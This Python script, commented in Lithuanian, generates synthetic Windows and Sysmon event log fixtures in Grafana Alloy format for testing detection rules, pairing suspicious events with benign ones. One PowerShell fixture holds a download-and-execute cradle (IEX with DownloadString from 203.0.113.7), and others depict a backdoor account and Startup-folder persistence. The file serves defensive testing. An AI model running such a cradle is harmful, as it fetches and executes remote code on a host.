"""
Generuoja windows_golden.json — Alloy `loki.source.windowsevent` (v1.20.1) formato
pavyzdžius kiekvienam taisyklių event ID.

Formatas tikslus pagal Alloy format.go: event_data/user_data = `<EventData>`/`<UserData>`
InnerXML eilutė (`<Data Name="...">reikšmė</Data>` seka), plius event_id, channel,
message, levelText. Laukų pavadinimai (Data Name) — pagal Microsoft ir Sysmon schemas.

PASTABA: tai schemos pagrindu sukonstruoti pavyzdžiai (laboratorijos Windows VM čia
neprieinamas). Turint VM, perrašykite tikrais įrašais: exportuokite kelis event'us su
`loki.source.windowsevent` ir pakeiskite `line` reikšmes — laukų pavadinimai nesikeis.
"""
from __future__ import annotations

import json
from pathlib import Path


def event_data(pairs: list[tuple[str, str]]) -> str:
    return "".join(f'<Data Name="{k}">{v}</Data>' for k, v in pairs)


def line(channel: str, event_id: int, message: str, data: str = "",
         user_data: str = "", level_text: str = "Information") -> str:
    event = {
        "source": "Microsoft-Windows-Security-Auditing" if channel == "Security" else channel,
        "channel": channel,
        "computer": "WIN11-LAB",
        "event_id": event_id,
        "levelText": level_text,
        "timeCreated": "2022-01-24T04:37:40.000000000Z",
        "eventRecordID": 100000 + event_id,
        "message": message,
    }
    if data:
        event["event_data"] = data
    if user_data:
        event["user_data"] = user_data
    return json.dumps(event, ensure_ascii=False)


CASES = [
    # --- Security kanalas ---
    {"name": "4625_failed_logon", "channel": "Security",
     "line": line("Security", 4625, "An account failed to log on.",
                  event_data([("SubjectUserSid", "S-1-5-18"), ("TargetUserName", "administrator"),
                              ("TargetDomainName", "WIN11-LAB"), ("Status", "0xc000006d"),
                              ("SubStatus", "0xc000006a"), ("LogonType", "3"),
                              ("IpAddress", "203.0.113.7"), ("IpPort", "51082"),
                              ("WorkstationName", "KALI")]))},
    {"name": "4740_account_lockout", "channel": "Security",
     "line": line("Security", 4740, "A user account was locked out.",
                  event_data([("TargetUserName", "jdoe"), ("TargetDomainName", "WIN11-LAB"),
                              ("TargetSid", "S-1-5-21-111-222-333-1105"),
                              ("SubjectUserName", "WIN11-LAB$"), ("CallerComputerName", "WIN11-LAB")]))},
    {"name": "4720_account_created", "channel": "Security",
     "line": line("Security", 4720, "A user account was created.",
                  event_data([("TargetUserName", "backdoor"), ("TargetDomainName", "WIN11-LAB"),
                              ("SubjectUserName", "attacker"), ("SubjectUserSid", "S-1-5-21-111-222-333-500"),
                              ("SamAccountName", "backdoor")]))},
    {"name": "4732_added_to_administrators", "channel": "Security",
     "line": line("Security", 4732, "A member was added to a security-enabled local group.",
                  event_data([("MemberName", "-"), ("MemberSid", "S-1-5-21-111-222-333-1106"),
                              ("TargetUserName", "Administrators"), ("TargetSid", "S-1-5-32-544"),
                              ("SubjectUserName", "attacker")]))},
    {"name": "4732_added_to_users_benign", "channel": "Security",
     "line": line("Security", 4732, "A member was added to a security-enabled local group.",
                  event_data([("MemberName", "-"), ("MemberSid", "S-1-5-21-111-222-333-1107"),
                              ("TargetUserName", "Users"), ("TargetSid", "S-1-5-32-545"),
                              ("SubjectUserName", "SYSTEM")]))},
    # 1102 duomenys yra UserData (ne EventData).
    {"name": "1102_audit_log_cleared", "channel": "Security",
     "line": line("Security", 1102, "The audit log was cleared.",
                  user_data="<LogFileCleared xmlns=\"http://manifests.microsoft.com/win/2004/08/windows/eventlog\">"
                            "<SubjectUserSid>S-1-5-21-111-222-333-500</SubjectUserSid>"
                            "<SubjectUserName>attacker</SubjectUserName>"
                            "<SubjectDomainName>WIN11-LAB</SubjectDomainName>"
                            "<SubjectLogonId>0x3e7</SubjectLogonId></LogFileCleared>")},
    {"name": "4624_logon_benign", "channel": "Security",
     "line": line("Security", 4624, "An account was successfully logged on.",
                  event_data([("TargetUserName", "jdoe"), ("TargetDomainName", "WIN11-LAB"),
                              ("LogonType", "2"), ("IpAddress", "127.0.0.1")]))},

    # --- PowerShell/Operational kanalas ---
    {"name": "4104_scriptblock_suspicious", "channel": "Microsoft-Windows-PowerShell/Operational",
     "line": line("Microsoft-Windows-PowerShell/Operational", 4104,
                  "Creating Scriptblock text (1 of 1):",
                  event_data([("MessageNumber", "1"), ("MessageTotal", "1"),
                              ("ScriptBlockText", "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a.ps1')"),
                              ("ScriptBlockId", "a1b2c3d4-0000-0000-0000-000000000001"),
                              ("Path", "")]), level_text="Warning")},
    {"name": "4104_scriptblock_benign", "channel": "Microsoft-Windows-PowerShell/Operational",
     "line": line("Microsoft-Windows-PowerShell/Operational", 4104,
                  "Creating Scriptblock text (1 of 1):",
                  event_data([("MessageNumber", "1"), ("MessageTotal", "1"),
                              ("ScriptBlockText", "Get-ChildItem C:\\Users | Sort-Object Name"),
                              ("ScriptBlockId", "a1b2c3d4-0000-0000-0000-000000000002"), ("Path", "")]))},

    # --- Sysmon/Operational kanalas ---
    {"name": "sysmon1_process_create", "channel": "Microsoft-Windows-Sysmon/Operational",
     "line": line("Microsoft-Windows-Sysmon/Operational", 1, "Process Create:",
                  event_data([("RuleName", "-"), ("UtcTime", "2022-01-24 04:37:40.123"),
                              ("ProcessId", "6120"), ("Image", "C:\\Windows\\System32\\whoami.exe"),
                              ("CommandLine", "whoami /all"), ("User", "WIN11-LAB\\jdoe"),
                              ("ParentImage", "C:\\Windows\\System32\\cmd.exe"),
                              ("ParentCommandLine", "cmd.exe /c whoami")]))},
    {"name": "sysmon3_network_connect", "channel": "Microsoft-Windows-Sysmon/Operational",
     "line": line("Microsoft-Windows-Sysmon/Operational", 3, "Network connection detected:",
                  event_data([("RuleName", "-"), ("UtcTime", "2022-01-24 04:38:00.000"),
                              ("ProcessId", "6120"), ("Image", "C:\\Windows\\System32\\rundll32.exe"),
                              ("User", "WIN11-LAB\\jdoe"), ("Protocol", "tcp"),
                              ("SourceIp", "10.0.0.50"), ("SourcePort", "50512"),
                              ("DestinationIp", "203.0.113.7"), ("DestinationPort", "443"),
                              ("DestinationHostname", "-")]))},
    {"name": "sysmon11_file_create_startup", "channel": "Microsoft-Windows-Sysmon/Operational",
     "line": line("Microsoft-Windows-Sysmon/Operational", 11, "File created:",
                  event_data([("RuleName", "-"), ("UtcTime", "2022-01-24 04:39:00.000"),
                              ("ProcessId", "6120"), ("Image", "C:\\Windows\\System32\\cmd.exe"),
                              ("TargetFilename", "C:\\Users\\jdoe\\AppData\\Roaming\\Microsoft\\Windows\\"
                                                 "Start Menu\\Programs\\Startup\\run.bat"),
                              ("CreationUtcTime", "2022-01-24 04:39:00.000")]))},
    {"name": "sysmon11_file_create_benign", "channel": "Microsoft-Windows-Sysmon/Operational",
     "line": line("Microsoft-Windows-Sysmon/Operational", 11, "File created:",
                  event_data([("RuleName", "-"), ("UtcTime", "2022-01-24 04:39:10.000"),
                              ("ProcessId", "7000"), ("Image", "C:\\Program Files\\app\\app.exe"),
                              ("TargetFilename", "C:\\Users\\jdoe\\Documents\\report.docx"),
                              ("CreationUtcTime", "2022-01-24 04:39:10.000")]))},
]

if __name__ == "__main__":
    out = Path(__file__).with_name("windows_golden.json")
    out.write_text(json.dumps({
        "captured_with": ("schema-derived (Microsoft/Sysmon EventData Data names), "
                          "Alloy loki.source.windowsevent format v1.20.1 — re-capture from lab VM when available"),
        "cases": CASES,
    }, ensure_ascii=False, indent=2))
    print(out, len(CASES), "cases")
